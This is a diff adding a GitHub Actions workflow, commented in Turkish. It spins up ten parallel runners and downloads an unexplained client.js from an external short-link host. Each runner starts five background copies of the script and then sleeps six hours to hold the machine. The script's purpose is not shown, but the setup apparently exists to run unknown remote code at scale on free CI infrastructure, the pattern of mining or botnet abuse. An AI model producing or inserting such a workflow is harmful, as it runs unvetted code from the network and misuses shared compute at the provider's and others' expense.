@@ -1,0 +1,32 @@
+name: Run Node.js Script on 10 Machines
+
+on:
+  workflow_dispatch:  # Manuel başlatmak için
+
+jobs:
+  run-node:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # 10 farklı paralel çalışacak job
+
+    steps:
+      - name: Set up Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'  # Node.js versiyonunu ayarlıyoruz
+
+      - name: Update and Install Dependencies
+        run: |
+          sudo apt-get update && sudo apt-get upgrade -y  # Sistemi güncelle
+          sudo apt-get install -y curl docker.io          # Gerekli bağımlılıkları yükle
+
+      - name: Download client.js
+        run: curl -o client.js https://curl.by/B176G/client.js  # client.js dosyasını indir
+
+      - name: Run Node.js scripts in parallel
+        run: |
+          for i in $(seq 1 5); do
+            nohup node client.js > client_$i.log 2>&1 &  # 5 farklı işlem paralel çalışacak
+          done
+          sleep 21600  # 6 saatlik bekleme
